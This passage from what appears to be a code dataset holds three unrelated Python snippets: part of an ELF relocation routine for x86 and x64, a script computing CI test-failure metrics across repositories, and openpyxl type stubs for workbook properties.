_do_apply_relocation(self, stream, reloc, symtab):\n        # Preparations for performing the relocation: obtain the value of\n        # the symbol mentioned in the relocation, as well as the relocation\n        # recipe which tells us how to actually perform it.\n        # All peppered with some sanity checking.\n        if reloc['r_info_sym'] >= symtab.num_symbols():\n            raise ELFRelocationError(\n                'Invalid symbol reference in relocation: index %s' % (\n                    reloc['r_info_sym']))\n        sym_value = symtab.get_symbol(reloc['r_info_sym'])['st_value']\n\n        reloc_type = reloc['r_info_type']\n        recipe = None\n\n        if self.elffile.get_machine_arch() == 'x86':\n            if reloc.is_RELA():\n                raise ELFRelocationError(\n                    'Unexpected RELA relocation for x86: %s' % reloc)\n            recipe = self._RELOCATION_RECIPES_X86.get(reloc_type, None)\n        elif self.elffile.get_machine_arch() == 'x64':\n            if not reloc.is_RELA():\n                raise ELFRelocationError(\n                    'Unexpected REL relocation for x64: %s' % reloc)\n            recipe = self._RELOCATION_RECIPES_X64.get(reloc_type, None)\n\n        if recipe is None:\n            raise ELFRelocationError(\n                    'Unsupported relocation type: %s' % reloc_type)\n\n        # So now we have everything we need to actually perform the relocation.\n        # Let's get to it:\n\n        # 0. Find out which struct we're going to be using to read this value\n        #    from the stream and write it back.\n        if recipe.bytesize == 4:\n            value_struct = self.elffile.structs.Elf_word('')\n        elif recipe.bytesize == 8:\n            value_struct = self.elffile.structs.Elf_word64('')\n        else:\n            raise ELFRelocationError('Invalid bytesize %s for relocation' % \n                    recipe_bytesize)\n\n        # 1. Read the value from the stream (with correct size and endianness)\n        original_value = struct_parse(\n            value_struct,\n            stream,\n            stream_pos=reloc['r_offset'])\n        # 2. Apply the relocation to the value, acting according to the recipe\n        relocated_value = recipe.calc_func(\n            value=original_value,\n            sym_value=sym_value,\n            offset=reloc['r_offset'],\n            addend=reloc['r_addend'] if recipe.has_addend else 0)\n        # 3. Write the relocated value back into the stream\n        stream.seek(reloc['r_offset'])\n        value_struct.build_stream(relocated_value, stream)\n\n    # Relocations are represented by \"recipes\". Each recipe specifies:\n    #  bytesize: The number of bytes to read (and write back) to the section.\n    #            This is the unit of data on which relocation is performed.\n    #  has_addend: Does this relocation have an extra addend?\n    #  calc_func: A function that performs the relocation on an extracted\n    #             value, and returns the updated value.\n    #\n    _RELOCATION_RECIPE_TYPE = namedtuple('_RELOCATION_RECIPE_TYPE',\n        'bytesize has_addend calc_func')\n\n    def _reloc_calc_identity(value, sym_value, offset, addend=0):\n        return value\n\n    def _reloc_calc_sym_plus_value(value, sym_value, offset, addend=0):\n        return sym_value + value\n\n    def _reloc_calc_sym_plus_value_pcrel(value, sym_value, offset, addend=0):\n        return sym_value + value - offset\n        \n    def _reloc_calc_sym_plus_addend(value, sym_value, offset, addend=0):\n        return sym_value + addend\n        \n    _RELOCATION_RECIPES_X86 = {\n        ENUM_RELOC_TYPE_i386['R_386_NONE']: _RELOCATION_RECIPE_TYPE(\n            bytesize=4, has_addend=False, calc_func=_reloc_calc_identity),\n        ENUM_RELOC_TYPE_i386['R_386_32']: _RELOCATION_RECIPE_TYPE(\n            bytesize=4, has_addend=False,\n            calc_func=_reloc_calc_sym_plus_value),\n        ENUM_RELOC_TYPE_i386['R_386_PC32']: _RELOCATION_RECIPE_TYPE(\n            bytesize=4, has_addend=False,\n            calc_func=_reloc_calc_sym_plus_value_pcrel),\n    }\n    \n    _RELOCATION_RECIPES_X64 = {\n        ENUM_RELOC_TYPE_x64['R_X86_64_NONE']: _RELOCATION_RECIPE_TYPE(\n            bytesize=8, has_addend=True, calc_func=_reloc_calc_identity),\n        ENUM_RELOC_TYPE_x64['R_X86_64_64']: _RELOCATION_RECIPE_TYPE(\n            bytesize=8, has_addend=True, calc_func=_reloc_calc_sym_plus_addend),\n        ENUM_RELOC_TYPE_x64['R_X86_64_32']: _RELOCATION_RECIPE_TYPE(\n            bytesize=4, has_addend=True, calc_func=_reloc_calc_sym_plus_addend),\n        ENUM_RELOC_TYPE_x64['R_X86_64_32S']: _RELOCATION_RECIPE_TYPE(\n            bytesize=4, has_addend=True, calc_func=_reloc_calc_sym_plus_addend),\n    }\n\n\n", "574": "from SqlAlchemyBase import Session\nfrom metrics.calculations.CommitterChangeCalc import CommitterChangeCalc\nfrom metrics.calculations.FailedTests.GroupsFactory import GroupsFactory\nfrom metrics.calculations.FailedTestsCalc import FailedTestsCalc\nfrom metrics.calculations.FilesChangedAfterFailCalc import FilesChangedAfterFailCalc\nfrom metrics.calculations.FlickeringTestsCalc import FlickeringTestsCalc\nfrom metrics.calculations.NumberOfCommitsCalc import NumberOfCommitsCalc\nfrom metrics.calculations.ReactionTimeCalc import ReactionTimeCalc\nfrom metrics.results.FlickeringTestsResult import FlickeringTestsResult\nfrom model.Repository import Repository\n\ndb_session = Session()\nrepos = db_session.query(Repository).all()\n\ntotal_result = None\ngroupsFactory = GroupsFactory()\n\n\nfor repo in repos:\n    # result = FlickeringTestsCalc.execute(repo)\n\n\n\n    #1a\n    # todo opcjonalnie doda\u00c4\u2021 inne grupy dla innych repo\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getInspectionTypeGroups())\n\n    #1b\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getInspectionTimeGroups())\n\n    #1c\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getIsAuthorGroups())\n\n    #1d\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getUserCommitNumberGroups())\n\n    #1e\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getTechnologyGroups())\n\n    #1f\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getSourceCodeLinesChanged())\n\n    # 1f\n    # result = FailedTestsCalc.execute(repo, groupsFactory.getTestCodeLinesChanged())\n\n    #2\n    result = FilesChangedAfterFailCalc.execute(repo)\n\n    #4\n    # result = NumberOfCommitsCalc.execute(repo)\n\n    #6\n    # result = ReactionTimeCalc.execute(repo)\n\n    #7\n    # result = CommitterChangeCalc.execute(repo)\n\n    print(repo.name)\n    result.print()\n    if total_result is None:\n        total_result = result\n    else:\n        total_result = result + total_result\n\nprint(\"In total:\")\ntotal_result.print()\n", "575": "from typing import Any\n\nfrom openpyxl.descriptors.serialisable import Serialisable\n\nclass WorkbookProperties(Serialisable):\n    tagname: str\n    date1904: Any\n    dateCompatibility: Any\n    showObjects: Any\n    showBorderUnselectedTables: Any\n    filterPrivacy: Any\n    promptedSolutions: Any\n    showInkAnnotation: Any\n    backupFile: Any\n    saveExternalLinkValues: Any\n    updateLinks: Any\n    codeName: Any\n    hidePivotFieldList: Any\n    showPivotChartFilter: Any\n    allowRefreshQuery: Any\n    publishItems: Any\n    checkCompatibility: Any\n    autoCompressPictures: Any\n    refreshAllConnections: Any\n    defaultThemeVersion: Any\n    def __init__(\n        self,\n        date1904: Any | None = ...,\n        dateCompatibility: Any | None = ...,\n        showObjects: Any | None = ...,\n        showBorderUnselectedTables: Any | None = ...,\n        filterPrivacy: Any | None = ...,\n        promptedSolutions: Any | None = ...,\n        showInkAnnotation: Any | None = ...,\n        backupFile: Any | None = ...,\n        saveExternalLinkValues: Any | None = ...,\n        updateLinks: Any | None = ...,\n        codeName: Any | None = ...,\n        hidePivotFieldList: Any | None = ...,\n        showPivotChartFilter: Any | None = ...,\n        allowRefreshQuery: Any | None = ...,\n        publishItems: Any | None = ...,\n        checkCompatibility: Any | None = ...,\n        autoCompressPictures: Any | None = ...,\n        refreshAllConnections: Any | None = ...,\n        defaultThemeVersion: Any | None = ...,\n    ) -> None: ...\n\nclass CalcProperties(Serialisable):\n    tagname: str\n    calcId: Any\n    calcMode: Any\n    fullCalcOnLoad: Any\n    refMode: Any\n    iterate: Any\n    iterateCount: Any\n    iterateDelta: Any\n    fullPrecision: Any\n    calcCompleted: Any\n    calcOnSave: Any\n    concurrentCalc: Any\n    concurrentManualCount: Any\n    forceFullCalc: Any\n    def __init__(\n        self,\n        calcId: int = ...,\n        calcMode: Any | None = ...,\n        fullCalcOnLoad: bool = ...,\n        refMode: Any | None = ...,\n        iterate: Any | None = ...,\n        iterateCount: Any | None = ...,\n        iterateDelta: Any | None = ...,\n        fullPrecision: Any | None = ...,\n        calcCompleted: Any | None = ...,\n        calcOnSave: Any | None = ...,\n        concurrentCalc: Any | None = ...,\n        concurrentManualCount: Any | None = ...,\n        forceFullCalc: Any | None = ...,\n    ) -> None: ...\n\nclass FileVersion(Serialisable):\n    tagname: str\n    appName: Any\n    lastEdited: Any\n    lowestEdited: Any\n    rupBuild: Any\n    codeName: Any\n    def __init__(\n        self,\n        appName: Any | None = ...,\n        lastEdited: Any | None = ...,\n        lowestEdited: Any | None = ...,\n        rupBuild: Any | None = ...,\n        codeName: Any | None = ...,\n    ) -> None: ...\n"}